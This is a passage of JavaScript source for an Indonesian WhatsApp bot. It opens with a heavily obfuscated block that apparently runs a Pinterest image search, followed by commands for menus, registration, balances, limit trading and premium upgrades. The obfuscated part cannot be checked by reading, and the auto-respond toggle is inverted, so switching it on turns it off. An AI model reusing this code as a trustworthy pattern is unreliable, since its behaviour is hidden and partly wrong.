_0x32c603(_0x221ceb,_0x1ab5ee);},'jSyRl':_0x3374f6(0x3c9,0x4bf,0x4ad,0x5fe,'bHh^')+_0x3374f6(0x3f1,0x48d,0x343,0x4bd,'tnx*')+_0x43a6d0(0x3e6,0x443,0x48f,'JsV1',0x511)+_0x43a6d0(0x3f0,0x359,0x2e6,'0$sC',0x38a)+_0x43a6d0(0x60d,0x4db,0x4b5,'5Tox',0x4fe)+_0x3374f6(0x256,0x2c4,0x1db,0x379,'i4xw')+_0x57e044(-0x1dd,-0x1e5,-0x1cc,-0xcf,'*I%r')+_0x279f31(-0x1fd,-0x16e,-0x216,-0x2a7,'SGxm')+_0x57e044(-0xf8,-0x173,-0x26a,-0x190,'o)0s')+'1','wsbKB':_0x279f31(-0xf8,-0x18,-0x196,-0x231,'vfIY')+_0x3374f6(0x528,0x3d9,0x52b,0x34b,'aXzI')+_0x3374f6(0x591,0x51a,0x4cd,0x5ad,'7Bl3'),'OdeGy':_0x279f31(-0x107,-0x7e,-0x193,-0x16f,'pD$Q')+_0x43a6d0(0x503,0x275,0x263,'pD$Q',0x3a5),'jOTYs':_0x49daec(0x3e1,0x543,0x3e6,'tnx*',0x32c),'saKhI':_0x49daec(0x398,0x44b,0x360,'u[Lt',0x47a),'LuJHZ':_0x279f31(-0x17a,-0xa9,-0x1bf,-0x266,'SaA0')+_0x49daec(0x552,0x597,0x4ff,'WoM1',0x455)+'n','LiBXw':_0x49daec(0x4ff,0x458,0x412,'5Tox',0x324)+'a4','LvmWi':_0x43a6d0(0x2e1,0x333,0x534,'lUEB',0x3fd)+'e','mpqJQ':_0x43a6d0(0x433,0x47e,0x526,'o32G',0x439)+_0x279f31(-0x18,0x10,0xbf,-0x1f,'iC8E')+_0x57e044(-0x92,-0x1a3,0xdc,-0xb5,'yd#j'),'YkArj':_0x43a6d0(0x6c3,0x5ef,0x794,'bHh^',0x634)+_0x49daec(0x57f,0x647,0x60d,'5Tox',0x62e)+_0x57e044(-0x23,-0x16c,0x81,-0x8c,'jXUb')+_0x279f31(-0xb5,0x5d,-0xcb,-0x199,'0$sC')+_0x3374f6(0x258,0x303,0x3f7,0x43e,'o)0s')+'/','LKCZJ':_0x57e044(-0x31,-0x13b,0x135,0x141,'WoM1')+'n','xSaYA':_0x57e044(-0x1b6,-0x116,-0x231,-0xb6,'8tM7')};function _0x279f31(_0x5a16bf,_0x203386,_0x5ed5cc,_0x5f556e,_0x565a6a){return _0x567016(_0x5a16bf-0xd5,_0x565a6a,_0x5a16bf- -0x515,_0x5f556e-0x183,_0x565a6a-0xb6);}function _0x49daec(_0x3072f8,_0x3c1bb8,_0x10945c,_0x121190,_0x29214a){return _0x1bdefd(_0x3072f8-0x111,_0x10945c-0x31,_0x121190,_0x121190-0xf5,_0x29214a-0x1e6);}function _0x43a6d0(_0x16a622,_0x3f84f0,_0x55fdd0,_0x1c84d5,_0x59a3c5){return _0x567016(_0x16a622-0x109,_0x1c84d5,_0x59a3c5-0xb9,_0x1c84d5-0x26,_0x59a3c5-0x107);}function _0x57e044(_0x2e825c,_0x32ed46,_0x118617,_0x13f4ad,_0x5b1799){return _0x24990b(_0x2e825c-0xfd,_0x32ed46-0x10c,_0x5b1799,_0x13f4ad-0x0,_0x2e825c- -0x549);}function _0x3374f6(_0x4017a5,_0x11ba18,_0x311234,_0x249b0f,_0x36554e){return _0x1bdefd(_0x4017a5-0x25,_0x11ba18- -0x7a,_0x36554e,_0x249b0f-0x15a,_0x36554e-0x1f);}return new Promise((_0x4cd95e,_0x5b4ed4)=>{function _0x48c675(_0x5e4283,_0x3d4e81,_0x28b004,_0x2dc7ba,_0x5d1b9f){return _0x279f31(_0x5d1b9f-0x5c4,_0x3d4e81-0x2f,_0x28b004-0x26,_0x2dc7ba-0x50,_0x2dc7ba);}function _0x14d31f(_0x5e7cf9,_0xb02de5,_0x2004c9,_0xa7a835,_0x13243b){return _0x279f31(_0x13243b-0x42e,_0xb02de5-0xfd,_0x2004c9-0x61,_0xa7a835-0x159,_0xa7a835);}function _0x34d81f(_0x2617c4,_0x3b47ed,_0x5b8a26,_0x41bd67,_0x48525d){return _0x57e044(_0x5b8a26-0x206,_0x3b47ed-0x17,_0x5b8a26-0x14b,_0x41bd67-0x97,_0x41bd67);}const _0x55861b={'UCrCS':function(_0x237a4e,_0x24d2cc){function _0x53efa7(_0x2c65d8,_0x4290de,_0x129d51,_0x4e1b4f,_0x80a452){return _0x2cd4(_0x2c65d8- -0xf0,_0x4290de);}return _0x52510e[_0x53efa7(0x2cc,'o)0s',0x279,0x3d8,0x200)](_0x237a4e,_0x24d2cc);},'UPYPv':_0x52510e[_0x87eff(-0x76,0x61,-0x7d,-0xbc,'2%[e')],'zNHab':function(_0x52198d,_0x55622f){function _0x654aa5(_0x3952ad,_0x3a1958,_0x1584da,_0x286293,_0x198540){return _0x87eff(_0x3952ad-0xbd,_0x3a1958-0x1b2,_0x1584da-0x1c6,_0x286293-0x2df,_0x198540);}return _0x52510e[_0x654aa5(0xb,-0x27,0x181,0x10f,'$6Wd')](_0x52198d,_0x55622f);},'YeagK':_0x52510e[_0x87eff(-0x2b3,-0x2b2,-0x116,-0x1a9,'MS4m')],'dREfT':_0x52510e[_0x15e573(-0x101,-0xa7,-0x3d,'jXUb',0x56)],'ZUejW':function(_0x9f9695,_0xb4dee8){function _0x294d71(_0x3b8841,_0x3f8b0c,_0x1d461,_0x24ac7a,_0x14c594){return _0x14d31f(_0x3b8841-0x12,_0x3f8b0c-0x136,_0x1d461-0x12c,_0x1d461,_0x3b8841-0x59);}return _0x52510e[_0x294d71(0x33f,0x43b,'1I75',0x336,0x418)](_0x9f9695,_0xb4dee8);},'lsvYL':function(_0x3c8a14,_0x207e45){function _0x2ae0f5(_0x3564ec,_0xe09ee1,_0x3b37ec,_0x299c2f,_0x9340fd){return _0x15e573(_0x3564ec-0xe7,_0xe09ee1-0x13a,_0x9340fd- -0x15d,_0x3b37ec,_0x9340fd-0x1be);}return _0x52510e[_0x2ae0f5(-0x64,-0x13b,'NbM]',0x8,0x2b)](_0x3c8a14,_0x207e45);}};function _0x15e573(_0x322c01,_0x26e6b0,_0x3b04ff,_0x526ac5,_0x457567){return _0x279f31(_0x3b04ff-0x117,_0x26e6b0-0x22,_0x3b04ff-0x19e,_0x526ac5-0x16,_0x526ac5);}function _0x87eff(_0x2f4051,_0x299329,_0x19ba3c,_0x549bac,_0x21268){return _0x279f31(_0x549bac-0x35,_0x299329-0x132,_0x19ba3c-0x1f4,_0x549bac-0x1a,_0x21268);}_0x52510e[_0x34d81f(0x319,0x336,0x1e0,'vfIY',0x30a)](fetch,_0x15e573(-0x45,-0x116,-0x7a,'RxuR',-0x169)+_0x34d81f(0x205,0x1c8,0xc7,'o)0s',0x19)+_0x48c675(0x50e,0x60a,0x5c0,'1I75',0x631)+_0x15e573(0xf,0x14c,0xf7,'Oq^^',0xb0)+_0x34d81f(0x9a,0x154,0x48,'1I75',-0x8d)+_0x34d81f(-0x127,0x15e,0x3e,'NbM]',-0xa7)+_0x15e573(-0x6,0x11c,0x11e,'X4DK',0x26c)+_0x48c675(0x479,0x584,0x496,'2%[e',0x49a)+_0x34d81f(0x212,0x1c6,0x253,'bHh^',0x172)+_0x34d81f(-0x2c,0x19a,0x3c,'*I%r',-0xe8)+_0x15e573(0x53,-0x196,-0xc5,'tnx*',-0x177)+_0x15e573(0x123,0x1a4,0xd9,'tb&K',-0x40)+_0x14d31f(0x262,0x245,0x163,'JTjt',0x25c)+_0x48c675(0x694,0x6d7,0x6e1,'MS4m',0x623)+_0x87eff(-0x25d,-0x24b,-0xd6,-0x148,'AP5M')+_0x87eff(-0x1ac,-0x3d,-0x85,-0xd7,'0$25')+_0x14d31f(0x2c0,0x312,0x288,'tnx*',0x2b9)+_0x15e573(-0x20,-0x93,0x60,'*I%r',0x120)+_0x34d81f(0x385,0x1d6,0x263,'yaQ2',0x23a)+'D'+_0x3cfb0c+(_0x15e573(0x161,0x291,0x15b,'pD$Q',0x1ee)+_0x48c675(0x41f,0x3fe,0x2bf,'0$25',0x418)+_0x34d81f(-0xd6,-0x27,0x7d,'!^yH',0x101)+_0x34d81f(0x375,0x2e9,0x274,'yaQ2',0x16d)+_0x48c675(0x4ca,0x56f,0x572,'iC8E',0x476)+_0x15e573(-0x8c,-0xd,-0x3e,'pD$Q',-0x2e)+_0x15e573(0x118,-0x105,0x23,'X4DK',-0xde)+_0x34d81f(0x286,0x25d,0x2e9,'L23G',0x345)+_0x15e573(-0x149,-0x1,0xe,'0$25',0xd)+_0x87eff(-0x1b4,0x64,-0x1a5,-0x91,'W0FY')+_0x14d31f(0x304,0x12d,0x14f,'$6Wd',0x263)+_0x15e573(-0xff,-0xa,-0xe9,'X4DK',-0xf9)+_0x48c675(0x6fc,0x687,0x6c5,'RxuR',0x607)+_0x14d31f(0x1eb,0x102,0x2c1,'0$25',0x24b)+'22')+_0x3cfb0c+(_0x34d81f(0x286,0x405,0x2f7,'2%[e',0x195)+_0x14d31f(0x401,0x513,0x47e,'AP5M',0x480)+_0x14d31f(0x32a,0x450,0x3a2,'L23G',0x38b)+_0x14d31f(0x3de,0x21f,0x3c9,'gH[4',0x31a)+_0x14d31f(0x382,0x4ad,0x5f0,'D%bt',0x4bd)+_0x87eff(0x90,0x14a,0x139,0x68,'lUEB')+_0x34d81f(-0x11c,0x162,0x24,'V^DA',-0x6d)+_0x48c675(0x772,0x6a7,0x60f,'D%bt',0x637)+_0x48c675(0x615,0x4fe,0x5b9,'L23G',0x4b1)+_0x48c675(0x67f,0x4f7,0x63c,'yd#j',0x599)+_0x87eff(-0x28,0x47,-0x7,-0xe,'iC8E')+_0x14d31f(0x1e4,0x2d2,0x2a5,'i4xw',0x277)+_0x34d81f(0x34f,0x20c,0x2df,'JsV1',0x3af)+_0x15e573(0x89,0x14f,0x17c,'JsV1',0xae)+_0x34d81f(0xea,0x84,0x1db,'B0x*',0x145)+_0x48c675(0x682,0x57a,0x689,'1I75',0x5af)+_0x48c675(0x5ae,0x6a4,0x6f2,'D%bt',0x5df)+_0x87eff(0xc6,0x87,0x101,0x8a,'NbM]')+_0x48c675(0x536,0x3cf,0x441,'RxuR',0x53a)+_0x48c675(0x30b,0x381,0x375,'o)0s',0x3de)+_0x15e573(0x76,-0x91,-0x68,'o32G',-0x91)+_0x14d31f(0x398,0x347,0x2ea,'tnx*',0x2bc)+_0x34d81f(-0x5a,0x113,0x68,'V^DA',-0x5b)+_0x15e573(0x9d,-0x11e,-0x2f,'*I%r',-0x31)+'59'),{'headers':{'accept':_0x52510e[_0x14d31f(0x3e7,0x48b,0x578,'q2PR',0x405)],'accept-language':_0x52510e[_0x87eff(0x162,0xf9,-0x91,0x28,'yaQ2')],'cache-control':_0x52510e[_0x34d81f(0x24c,0x3b5,0x246,'0$25',0x1ff)],'pragma':_0x52510e[_0x14d31f(0x240,0x476,0x348,'D%bt',0x36c)],'sec-fetch-dest':_0x52510e[_0x15e573(0x9a,0x1a0,0x198,'*I%r',0x9e)],'sec-fetch-mode':_0x52510e[_0x34d81f(0x445,0x312,0x2d6,'pD$Q',0x238)],'sec-fetch-site':_0x52510e[_0x14d31f(0x2bb,0x31a,0xc1,'yaQ2',0x233)],'sec-gpc':'1','x-app-version':_0x52510e[_0x48c675(0x622,0x6e9,0x66d,'7Bl3',0x5aa)],'x-pinterest-appstate':_0x52510e[_0x15e573(-0xd2,0xb4,-0x92,'vfIY',0x7e)],'x-requested-with':_0x52510e[_0x34d81f(0x2f7,0x209,0x242,'JsV1',0x1f2)]},'referrer':_0x52510e[_0x87eff(0x16a,-0x110,-0xad,0x17,'yaQ2')],'referrerPolicy':_0x52510e[_0x14d31f(0x167,0x175,0x377,'JAaZ',0x217)],'body':null,'method':_0x52510e[_0x34d81f(0x117,0x126,0x47,'W0FY',0x19a)],'mode':_0x52510e[_0x87eff(-0x5e,0x52,-0x92,0x89,'o)0s')]})[_0x34d81f(-0x141,0x1d,0x22,'iC8E',-0x131)](_0x159c45=>_0x159c45[_0x15e573(0x183,0x162,0x50,'pD$Q',0x61)]())[_0x34d81f(0x80,-0xf1,0x46,'!^yH',-0x11e)](_0xeefe7a=>{function _0x3b207e(_0x45d504,_0x23e311,_0x2cc321,_0x1ceedf,_0x2dd49c){return _0x14d31f(_0x45d504-0x99,_0x23e311-0x135,_0x2cc321-0xc8,_0x23e311,_0x2cc321- -0xdf);}function _0x3edfb5(_0x2c1adf,_0x1e0e24,_0x25a562,_0x370637,_0x1e97c2){return _0x14d31f(_0x2c1adf-0x174,_0x1e0e24-0x1d3,_0x25a562-0x148,_0x25a562,_0x1e97c2- -0x453);}function _0x48d3a8(_0x1a3dc3,_0x3f8bd6,_0x323021,_0x5037dd,_0x3ad374){return _0x48c675(_0x1a3dc3-0x1be,_0x3f8bd6-0x159,_0x323021-0x15e,_0x3ad374,_0x1a3dc3- -0x31);}function _0x2dfefc(_0x30bc7b,_0x536903,_0x2e1000,_0x261e08,_0x1b2fb6){return _0x34d81f(_0x30bc7b-0xcb,_0x536903-0x64,_0x30bc7b- -0x11b,_0x2e1000,_0x1b2fb6-0x1ef);}function _0x4dea24(_0x3166d3,_0x451023,_0x2e61e9,_0x56253a,_0x425078){return _0x48c675(_0x3166d3-0x165,_0x451023-0x168,_0x2e61e9-0x155,_0x56253a,_0x2e61e9- -0x4df);}if(_0x55861b[_0x3edfb5(-0xb4,0x50,'HHWV',0x125,0x68)](_0x55861b[_0x3b207e(0x248,'X4DK',0x34b,0x272,0x2b9)],_0x55861b[_0x3b207e(0x341,'$6Wd',0x2e9,0x1b4,0x2d6)]))_0x55861b[_0x3b207e(0xee,'q2PR',0x11b,0x221,0x17c)](_0x5c4204,_0x55861b[_0x2dfefc(0x13b,0x1aa,'gH[4',0x8,0x4e)]);else{const _0x39a22f=_0xeefe7a[_0x48d3a8(0x4d5,0x511,0x440,0x5c4,'i4xw')+_0x2dfefc(-0x38,0x137,'X4DK',0x10c,-0x17e)+_0x48d3a8(0x3d6,0x38d,0x3e6,0x3fa,'vfIY')+'se'][_0x3b207e(0x1a5,'gH[4',0x1ff,0x357,0x2a7)][_0x3edfb5(0x6b,-0x12d,'u[Lt',-0xf6,0x6)+'ts'][Math[_0x48d3a8(0x5b1,0x4c8,0x709,0x4ed,'D%bt')](_0x55861b[_0x48d3a8(0x50a,0x45b,0x4f2,0x3a4,'HHWV')](Math[_0x2dfefc(-0x32,0xe7,'JAaZ',0xfa,-0xb)+'m'](),_0xeefe7a[_0x3edfb5(-0x1b4,-0x178,'V^DA',-0x161,-0x1d4)+_0x48d3a8(0x401,0x290,0x301,0x4a8,'X4DK')+_0x2dfefc(-0x21,-0x66,'iC8E',-0x156,0x115)+'se'][_0x2dfefc(0x82,-0x10,'aXzI',0x1e4,0x1db)][_0x2dfefc(-0x72,-0x182,'RxuR',-0x123,0xab)+'ts'][_0x3b207e(0x37b,'Oq^^',0x260,0x2f5,0x243)+'h']))];var _0x25ac40=[];const _0x30a71f={};_0x30a71f[_0x3b207e(0x2ad,'L23G',0x15b,0x15a,0x2b4)]=_0x39a22f[_0x2dfefc(-0x45,0xb9,'o)0s',-0xae,-0xfa)+'s'][_0x48d3a8(0x4c8,0x3b3,0x35e,0x3e1,'0$sC')][_0x3edfb5(0x8,-0x1cb,'$6Wd',0xa9,-0xa1)],_0x25ac40[_0x48d3a8(0x350,0x21b,0x44d,0x2d7,'V5VU')](_0x30a71f),_0x55861b[_0x4dea24(0xae,0x49,-0xb,'JTjt',0x149)](_0x4cd95e,_0x25ac40);}})[_0x14d31f(0x3dd,0x51e,0x526,'X4DK',0x4b1)](_0x5b4ed4);});}const pinterest=_0x4d3559=>new Promise((_0x5a6bb9,_0x49ed43)=>{function _0x48661b(_0x588ffb,_0x898ab5,_0x1ac390,_0x4cffa2,_0x25b1d6){return _0x5db4ce(_0x588ffb-0x6c,_0x588ffb- -0x91,_0x1ac390-0x48,_0x25b1d6,_0x25b1d6-0x1f1);}const _0x38f1c1={'QdHCt':function(_0x8e3bda,_0x19bf6d){return _0x8e3bda(_0x19bf6d);}};function _0x5ed8d8(_0x44ab21,_0x1728fc,_0x5979d6,_0x19ffcd,_0x5d4bc0){return _0x1bdefd(_0x44ab21-0x11,_0x19ffcd- -0x393,_0x1728fc,_0x19ffcd-0x162,_0x5d4bc0-0xae);}function _0x5b7440(_0x3862b5,_0x13398d,_0x211384,_0x256b37,_0x5459fe){return _0x1bdefd(_0x3862b5-0x9,_0x5459fe- -0x160,_0x256b37,_0x256b37-0x170,_0x5459fe-0xbb);}_0x38f1c1[_0x5ed8d8(-0xca,'gH[4',0x18e,0x72,-0xf0)](pinterestSearch,_0x4d3559)[_0x5ed8d8(0x123,'1I75',0xde,0xdf,0x1c3)](_0x1542a0=>{function _0x55776f(_0x5225dd,_0x49be8b,_0x13c042,_0x19b090,_0x5f0029){return _0x5ed8d8(_0x5225dd-0x168,_0x19b090,_0x13c042-0x111,_0x13c042- -0x121,_0x5f0029-0x13);}function _0x5ee902(_0x5fb22d,_0x1671e8,_0x4b1056,_0x1d8e56,_0x73c5cd){return _0x48661b(_0x1d8e56-0x28d,_0x1671e8-0x84,_0x4b1056-0x1a5,_0x1d8e56-0x12b,_0x1671e8);}const _0x3980cf={};function _0x2705a7(_0x540635,_0x4d54b0,_0x2c051d,_0x233247,_0x1d3d8d){return _0x48661b(_0x233247-0x6f,_0x4d54b0-0x53,_0x2c051d-0xe7,_0x233247-0x9b,_0x4d54b0);}function _0x81b91d(_0x124cca,_0x45ecdd,_0x14574b,_0x3ad9d9,_0x6b5734){return _0x48661b(_0x124cca-0x6f,_0x45ecdd-0xd1,_0x14574b-0x1b,_0x3ad9d9-0xc6,_0x45ecdd);}_0x3980cf[_0x2705a7(0x23d,'Oq^^',0x2f9,0x1a9,0xf9)+'s']=0xc8,_0x3980cf[_0x2705a7(0x1c1,'u[Lt',0x8f,0x9e,0x60)]=_0x1542a0[0x5*0x735+-0x3+0x2*-0x1203][_0x2705a7(-0x20,'qv*F',0x26e,0x12a,0xa1)],_0x38f1c1[_0x2705a7(0x237,'NbM]',-0x89,0xe4,0x234)](_0x5a6bb9,_0x3980cf);})[_0x48661b(-0xa8,-0xc6,-0xd1,-0xaa,'W0FY')](_0x49ed43);});pinterest(q)[_0x5db4ce(0xad,0x128,-0x2d,'V5VU',0x211)](async _0x58cb44=>{function _0x2cefbf(_0x3db3b8,_0x4ae35c,_0x4f32e4,_0xe91d,_0x4c9c9b){return _0x567016(_0x3db3b8-0x166,_0x3db3b8,_0x4f32e4- -0x10f,_0xe91d-0x6f,_0x4c9c9b-0x141);}function _0x372dc2(_0x322d33,_0xea94d7,_0x2b0754,_0x33c839,_0x2f02b5){return _0x5db4ce(_0x322d33-0x176,_0xea94d7-0x9c,_0x2b0754-0x91,_0x33c839,_0x2f02b5-0x3f);}function _0x561b3b(_0x2c6be8,_0x1a6de0,_0x14e6ba,_0x1cb6bc,_0x386d83){return _0x1bdefd(_0x2c6be8-0xb9,_0x1cb6bc- -0xb1,_0x14e6ba,_0x1cb6bc-0xf2,_0x386d83-0x40);}function _0x1f852a(_0x42bb63,_0x58f55c,_0x23da50,_0x1514d5,_0x52d3e7){return _0x592013(_0x1514d5-0x269,_0x58f55c-0x15f,_0x23da50-0xd,_0x1514d5-0x8c,_0x42bb63);}function _0x233289(_0x412e79,_0x1a665e,_0x235759,_0x3e4a02,_0xf564c7){return _0x24990b(_0x412e79-0x1ef,_0x1a665e-0x1ac,_0xf564c7,_0x3e4a02-0x8a,_0x235759- -0x1f9);}const _0x4b669a={'RmlHn':function(_0x39e1f2,_0x378433){return _0x39e1f2(_0x378433);}};let _0x4e6240=await _0x4b669a[_0x1f852a('!^yH',0x229,0x31b,0x371,0x21a)](getBuffer,_0x58cb44[_0x1f852a('Oq^^',0x2c1,0x2c6,0x36d,0x49d)]);Zeeone[_0x561b3b(0x1fa,0x338,'WoM1',0x320,0x339)+_0x561b3b(0x398,0x2e3,'V^DA',0x397,0x4d0)+'e'](from,_0x4e6240,MessageType[_0x372dc2(0x1ac,0x1c1,0x306,'5Tox',0x238)],{'caption':_0x1f852a('V5VU',0x39d,0x415,0x2e4,0x431)+_0x1f852a('W0FY',0x4af,0x5d6,0x4ad,0x43c)+_0x372dc2(0x259,0x2a0,0x39a,'vfIY',0x3f2)+':\x20'+q,'quoted':Ofc,'thumbnail':Buffer[_0x372dc2(0x9d,0x124,0x195,'1I75',0x157)](-0xa37*0x1+0x164b+-0x305*0x4)});})[_0x1bdefd(0x3e8,0x4ea,'V^DA',0x3bc,0x562)](async _0x54b217=>{function _0x4fafd7(_0x148013,_0x57ec56,_0xb38f57,_0x33ec02,_0x5d6d23){return _0x24990b(_0x148013-0x80,_0x57ec56-0xe7,_0x33ec02,_0x33ec02-0x129,_0x5d6d23-0xe4);}function _0x5175c4(_0x414faf,_0x541b72,_0x13d138,_0x12523b,_0x520e93){return _0x592013(_0x12523b-0x285,_0x541b72-0xa0,_0x13d138-0x1f3,_0x12523b-0x2,_0x414faf);}function _0x3f0e97(_0x30328e,_0xc76c8e,_0x1b007f,_0x219c7f,_0x498627){return _0x24990b(_0x30328e-0x8f,_0xc76c8e-0xa9,_0xc76c8e,_0x219c7f-0x2a,_0x219c7f- -0x27b);}function _0xb46d9a(_0x229a7d,_0x4eb7a1,_0x5b36fe,_0x1c1d82,_0x17448c){return _0x24990b(_0x229a7d-0x1e7,_0x4eb7a1-0x110,_0x229a7d,_0x1c1d82-0x199,_0x17448c- -0x199);}const _0x391ad5={'VRjRK':function(_0x41b902,_0x1e0f8c){return _0x41b902(_0x1e0f8c);},'oRGft':_0x4fafd7(0x753,0x767,0x4e8,'L23G',0x646)+_0x4fafd7(0x57a,0x619,0x5a9,'RxuR',0x672)+_0x3f0e97(0xd6,'NbM]',0x196,0xfb,0x171)+'an'};function _0x3d55f8(_0x347b62,_0x4bcb2f,_0x33794e,_0x86bdba,_0x3b2c22){return _0x592013(_0x3b2c22-0x303,_0x4bcb2f-0x14c,_0x33794e-0xa4,_0x86bdba-0xd3,_0x347b62);}_0x391ad5[_0xb46d9a('yaQ2',0x1d9,0x21c,0xa6,0x1f5)](reply,_0x391ad5[_0xb46d9a('$6Wd',0x50e,0x514,0x552,0x446)]);});break;}
						switch (command) {
						case 'allmenu': case 'help': case 'menu':
									ihsh = `${owner_number}@s.whatsapp.net`
									let cekvipp = ms(premium.getPremiumExpired(sender,premium) - Date.now())
									let gaklo = [{
										"buttonId": `mystat`,
										"buttonText": {
											"displayText": "✓ STATICTIC"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "⎙ SEWABOT"
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, menubot.allmenu(namabot, pushname, sender, isOwner, isPremium, cekvipp, getLimit, limitawal,limit, balance, getBalance, simbolnya, petik, prefix), `Total hit : ${hitall}${enter}Hit today : ${hit_today.length}${enter}${enter}${namabot}™© | ${owner_name}`, thumbnail, gaklo, {contextInfo: { mentionedJid: [sender]}})
										break
							case 'verify': case 'daftar':
										if (isUser) return reply('Kamu sudah terdaftar di dalam database')
										addRegisterUser(sender, pushname, bio_user, wib)
										let ran_blc = randomNomor(50)
										addBalance(sender, ran_blc, balance)
										fs.writeFileSync('./database/user.json', JSON.stringify(_user))
										teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
										let papako = [{
											"buttonId": `menu`,
											"buttonText": {
												"displayText": "MENU"
												},
												"type": "RESPONSE"
												},{
													"buttonId": `me`,
													"buttonText": {
														"displayText": "PROCFILE"
														},
														"type": "RESPONSE"
													}]
											sendButLocation(from, teks , `Thank for verification 💋\n${namabot}™© | By ${owner_name}`, thumbnail, papako, {contextInfo: { mentionedJid: [sender]}})
									break
						case 'autoregis': case 'register':
									if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
									if (args[0] === "on") {
										if (autoregister === true) return reply(`Mode ${command} telah aktif sebelumnya`)
										autoregister = true
										reply(`${command} di aktifkan`)
										} else if (args[0] === "off") {
											if (autoregister === false) return
											autoregister = false
											reply(`${command} telah dinonaktifkan`)
											} else if (!q) {
												sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
												{
													buttonId: 'register on',
													buttonText: {
														displayText: `On`,
														},
														type: 1,
														},
														{
															buttonId: 'register off',
															buttonText: {
																displayText: `Off`,
																},
																type: 1,
																},
																]);
															}
									break;
						case 'autorespon': case 'autorespond':
									if (!isOwner && !isCreator && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (q === 'on'){
										if (autorespon === true) return reply(`${command} telah aktif sebelumnya`)
										autorespon = false
										reply(`${command} di aktifkan`)
										} else if (q === 'off'){
											if (autorespon === false) return
											autorespon = true
											reply(`${command} telah dinonaktifkan`)
											} else if (!q) {
												sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
												{
													buttonId: 'autorespon on',
													buttonText: {
														displayText: `On`,
														},
														type: 1,
														},
														{
															buttonId: 'autorespon off',
															buttonText: {
																displayText: `Off`,
																},
																type: 1,
																},
																]);
															}
									break;
						case 'public':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
									if (public_mode === false) return
									public_mode = false
									sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [
									{
										buttonId: `self`,
										buttonText: {
											displayText: `Self Mode`,
											},
											type: 1,
											}]);
									break;
						case 'self':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
									if (public_mode === true) return
									public_mode = true
									sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [
									{
										buttonId: `public`,
										buttonText: {
											displayText: `Public Mode`,
											},
											type: 1,
											}]);
									break;
						case 'topbalance':
									if(!isGroup)return reply(mess.only.group)
									let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
									let mebn = [];
									for (let i of balance){
										mebn.push(i.id)
										let bl = (i.balance)
										txot += `🆔 *ID :* @${i.id.split("@")[0]}\n💹 *Balance :* ${bl}\n\n`
										}
									mentions(txot, mebn, true)
									break
						case 'toplimit':{
									if(!isGroup)return reply(mess.only.group)
									let txot = `*── 「 TOP  LIMIT 」 ──*\n\n`
									let mebn = [];
									for (let i of limit){
										mebn.push(i.id)
										let bl = (i.limit)
										txot += `🆔 *ID :* @${i.id.split("@")[0]}\n📊 *Limit :* ${bl}\n\n`
									}
									mentions(txot, mebn, true)
									}
									break
						case 'bal': case 'limit': case 'ceklimit': case 'balance': 
									reply(`*${ucapannya} @${sender.split("@")[0]}* 

*🌐 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}*
*💹 Balance : $${getBalance(sender, balance)}*


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal*

*Example :*
${prefix}buylimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
									break
						case 'level':{
									reply(`@${sender.split("@")[0]}

*📊 Level : ${getLevelingLevel(sender)}*
*🎯 Xp : ${getLevelingXp(sender)}*`)
}
									break
						case 'giftlimit': case 'givelimit':
									if (isPremium) return reply(`User Premium Tidak Bisa Melakukan Gift Limit Lord`)
									if (!isGroup) return reply(mess.only.group)
									if (!q.includes('|')) return  reply(`Contoh ${prefix + command} _@user | Nominal_`)
									const tujuan = q.substring(0, q.indexOf('|') - 1)
									const jumblah = q.substring(q.lastIndexOf('|') + 1)
									if(isNaN(jumblah)) return await reply('Jumlah Harus Berupa Angka Lord')
									if (jumblah < 1 ) return reply(`minimal transfer 1`)
									if (getLimit(sender, limitawal, limit) < jumblah) return reply(`Limit Mu Tidak Mencukupi Untuk Melakukan Gift Limit`)
									const tujuantf = `${tujuan.replace("@","")}@s.whatsapp.net`
									hasiltf = jumblah
									giveLimit(tujuantf, hasiltf, limit)
									beliprem(sender, jumblah)
									reply(`─ 「 *SUKSES* 」 ─

SUKSES TRANSFER LIMIT

🆔 *Pengirim :* @${sender.split("@")[0]}
📛 *Penerima :* ${tujuan}
💹 *Jumlah Limit :* ${jumblah}

Example : 
${prefix}giftlimit @user | 10 

*NOTE :*
Pastikan Transfer Limit Benar`)
									break 
						case 'buyprem': case 'beliprem':
									if (isPremium) return reply('Loe Dah Prem Cuy')
									if (getLimit(sender, limitawal, limit) < 1000) return reply(`Limitmu Tidak Cukup.\nDi Perlukan 1000 Limit Untuk Menjadi User Premium Trial 3 Hari`)
									premium.addPremiumUser(`${sender}`, `3d`, premium)
									sendButMessage(from, `*Sekarang Akun Anda Telah Premium*`, `Klik Untuk Mengecek Waktu Expired`, [
									{
										buttonId: `cekprem`,
										buttonText: {
											displayText: `🔖 CEK PREMIUM`,
											},
											type: 1,
											}]);
									beliprem(sender, 1000)
									break
						case 'buylimit':{
									if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
									if (q.includes('-')) return reply(`Jangan menggunakan -`)
									if (isNaN(q)) return reply(`Harus berupa angka`)
									let ane = Number(nebal(q) * 100)
									if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
									kurangBalance(sender, ane, balance)
									giveLimit(sender, nebal(q), limit)
									reply(`Pembeliaan limit sebanyak ${q} berhasil

*📊 Sisa Balance : ${getBalance(sender, balance)}*
*💹 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
									break
						case 'playstore': 
									if(!q) return reply('Mau cari apa lord')
									reply(mess.wait)
									let play = await hx.playstore(q)
